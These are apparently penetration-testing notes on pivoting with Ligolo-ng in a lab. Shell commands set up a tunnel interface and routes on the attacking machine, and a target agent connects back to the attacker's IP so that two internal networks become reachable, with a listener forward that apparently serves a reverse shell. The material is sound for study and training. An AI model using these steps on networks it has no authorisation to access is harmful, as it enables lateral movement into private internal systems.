---
description: This page covers both single and double pivoting techniques.
---

# Ligolo-ng

![](../../../.gitbook/assets/image)

[Download](https://github.com/nicocha30/ligolo-ng/releases) respective agent and proxy file depending on the OS. Install agent on the target and proxy on attacking machine.

#### **On Attacking Machine**

{% code title="Shoot up ligolo-ng interface on attacking machine" %}
```shellscript
ip tuntap add user root mode tun ligolo
ip link set ligolo up
ifconfig # Verify new interface
```
{% endcode %}

{% code title="Proceed to "On Target Machine" after this" %}
```shellscript
tar -xvzf ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz # Unzip proxy file
./proxy -selfcert # Start ligolo-ng (Listens on port 11601 by default)
```
{% endcode %}

{% code title="Proceed to "Single Pivot" after this" %}
```shellscript
ligolo-ng >> session # Pick the created session 1
ligolo-ng >> ifconfig # Discloses an internal network B
```
{% endcode %}

{% code title="Proceed to "Double Pivot" after this" %}
```shellscript
ligolo-ng >> start # Start the tunnel to Network B (You can ping Windows 10 now)
```
{% endcode %}

{% code title="Proceed to code block below this" %}
```shellscript
ligolo-ng >> session # Pick the created session 2
ligolo-ng >> ifconfig # Discloses an internal network C
```
{% endcode %}

{% code title="Proceed to code block below this" %}
```shellscript
ip route add 192.168.159.0/24 dev ligolo # Add the internal IP to the IP route
ip route list # Verify the route
```
{% endcode %}

```shellscript
ligolo-ng >> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
ligolo-ng >> start # Start the tunnel to Network C
```

#### **On Target Machine (Windows Server 2019)**

{% code title="Proceed to third code block in "On Attacking Machine" after this" %}
```shellscript
./agent.exe -connect 192.168.1.5:11601 -ignore-cert # Establish ligolo-ng session 1
```
{% endcode %}

### Single Pivot

![](<../../../.gitbook/assets/image (1)>)

{% code title="Proceed to forth code block in "On Attacking Machine" after this" %}
```shellscript
ip route add 192.168.148.0/24 dev ligolo # Add the internal IP to the IP route
ip route list # Verify the route
```
{% endcode %}

### Double Pivot

![](<../../../.gitbook/assets/image (2)>)

{% code title="Proceed to fifth code block in "On Attacking Machine" after this" %}
```shellscript
agent.exe -connect 192.168.1.5:11601 -ignore-cert # Establishing ligolo-ng session 2
```
{% endcode %}

> Credits: [hackingarticles.in](https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/)
